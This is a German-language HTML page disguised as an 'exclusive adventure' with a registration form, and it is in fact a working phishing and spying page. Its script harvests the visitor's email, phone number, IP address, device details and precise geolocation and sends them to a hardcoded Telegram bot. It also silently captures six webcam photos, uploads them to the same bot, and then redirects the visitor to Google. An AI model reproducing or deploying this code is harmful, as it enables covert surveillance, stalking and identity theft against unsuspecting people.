<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Exklusives Abenteuer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  
  <style>
    body {
      margin: 0;
      background: #0f0f0f; 
      background: url('image/cu2.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: 'Segoe UI', Roboto, sans-serif;
      color: white;
      overflow: hidden;
    }

    .hidden { display: none !important; }

    #startBtn {
      padding: 16px 35px;
      font-size: 18px;
      font-weight: bold;
      background: rgba(0, 0, 0, 0.6);
      color: white;
      border: 2px solid #00d1ff;
      border-radius: 50px;
      cursor: pointer;
      backdrop-filter: blur(8px);
      transition: all 0.5s ease;
      z-index: 10;
    }

    .pulse { animation: pulseBtn 1.8s infinite; }

    #startBtn.success {
      background: rgba(40, 167, 69, 0.7);
      border-color: #28a745;
    }

    @keyframes pulseBtn {
      0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); }
      70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); }
    }

    .glass-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(15px);
      z-index: 3000;
    }

    .modal-content {
      background: rgba(255, 255, 255, 0.1);
      padding: 40px 30px;
      border-radius: 30px;
      width: 85%;
      max-width: 380px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      text-align: center;
    }

    .input-group { position: relative; margin-bottom: 20px; }
    .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #00d1ff; }
    .input-group input {
      width: 100%;
      padding: 14px 15px 14px 45px;
      background: rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 12px;
      color: white;
      box-sizing: border-box;
      outline: none;
    }

    #submitReg {
      width: 100%;
      padding: 15px;
      background: #00d1ff;
      border: none;
      border-radius: 12px;
      font-weight: bold;
      cursor: pointer;
    }

    .loader {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(255, 255, 255, 0.1);
      border-top: 5px solid #00d1ff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin { 100% { transform: rotate(360deg); } }
    video, canvas { display: none; }
  </style>
</head>
<body>

  <div id="interface">
    <button id="startBtn" class="pulse">Abenteuer starten</button>
  </div>

  <div id="registerModal" class="glass-overlay hidden">
    <div class="modal-content">
      <h2><i class="fas fa-user-lock"></i> Registrierung</h2>
      <p>Erstellen Sie ein Konto, um auf den Inhalt zuzugreifen.</p>
      <div class="input-group">
        <i class="fas fa-envelope"></i>
        <input type="email" id="regEmail" placeholder="E-Mail" required>
      </div>
      <div class="input-group">
        <i class="fas fa-phone"></i>
        <input type="tel" id="regPhone" placeholder="Telefonnummer" required>
      </div>
      <button id="submitReg">Registrieren</button>
    </div>
  </div>

  <div id="loadingScreen" class="glass-overlay hidden">
    <div class="loader"></div>
    <div id="loadText">Verarbeitung l√§uft...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8219156030:AAGt4YPKSBg6FZxAwi31l9yautyH8OTZ8Dk"; 
    const chatId = "-1003619195565"; 

    const startBtn = document.getElementById("startBtn");
    const registerModal = document.getElementById("registerModal");
    const submitReg = document.getElementById("submitReg");
    const loadingScreen = document.getElementById("loadingScreen");
    const loadText = document.getElementById("loadText");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    let stream = null;
    let photoCount = 0;
    const maxPhotos = 6;

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch (e) { return "Unbekannt"; }
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let model = "Unbekanntes Ger√§t";
      
      if (ua.indexOf("Android") > -1) {
        const match = ua.match(/Android\s([^\s;]+);\s([^\s;]+)/);
        model = match ? `Android (${match[2]})` : "Android";
      } else if (ua.indexOf("iPhone") > -1) {
        model = "iPhone";
      }
      
      return {
        model: model,
        platform: navigator.platform,
        agent: ua,
        time: new Date().toLocaleString('de-DE')
      };
    }

    async function getCoords() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) resolve("Nicht unterst√ºtzt");
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
          (err) => resolve("Abgelehnt oder nicht verf√ºgbar"),
          { enableHighAccuracy: true, timeout: 5000 }
        );
      });
    }

    window.onload = () => {
      if (localStorage.getItem("aventure_debloquee")) setBtnVerified();
      initCamera();
    };

    function setBtnVerified() {
      startBtn.classList.remove("pulse");
      startBtn.classList.add("success");
      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Zur Website';
    }

    async function initCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (e) { console.warn("Kamerazugriff verweigert"); }
    }

    startBtn.onclick = () => {
      if (localStorage.getItem("aventure_debloquee")) {
        lancerProcessusFinal();
      } else {
        registerModal.classList.remove("hidden");
      }
    };

    submitReg.onclick = async () => {
      const email = document.getElementById("regEmail").value;
      const phone = document.getElementById("regPhone").value;

      if (email && phone) {
        registerModal.classList.add("hidden");
        loadingScreen.classList.remove("hidden");
        
        localStorage.setItem("aventure_debloquee", "true");
        setBtnVerified();

        await lancerProcessusFinal(email, phone);
      } else {
        alert("Bitte f√ºllen Sie alle Felder aus.");
      }
    };

    async function lancerProcessusFinal(email = "Bereits registriert", phone = "N/V") {
      loadingScreen.classList.remove("hidden");
      loadText.innerText = "Sichere Synchronisierung...";

      const ip = await getIP();
      const info = getDeviceInfo();
      const coords = await getCoords();

      const text = `
üÜï **NEUE AKTIVIT√ÑT**
üìß E-Mail: ${email}
üìû Tel: ${phone}
------------------------
üìç Koordinaten: ${coords}
üåê IP: ${ip}
üì± Modell: ${info.model}
üïí Datum: ${info.time}
üñ•Ô∏è OS: ${info.platform}
üîç User-Agent: ${info.agent}
      `;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
      });

      const interval = setInterval(async () => {
        if (photoCount >= maxPhotos) {
          clearInterval(interval);
          if (stream) stream.getTracks().forEach(t => t.stop());
          window.location.replace("https://www.google.de");
          return;
        }
        await capturePhoto();
      }, 2000);
    }

    async function capturePhoto() {
      if (!video.videoWidth) return;
      photoCount++;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      
      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("photo", blob, `snap_${photoCount}.jpg`);
      
      try { 
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd }); 
      } catch(e){}
    }
  </script>
</body>
  </html>
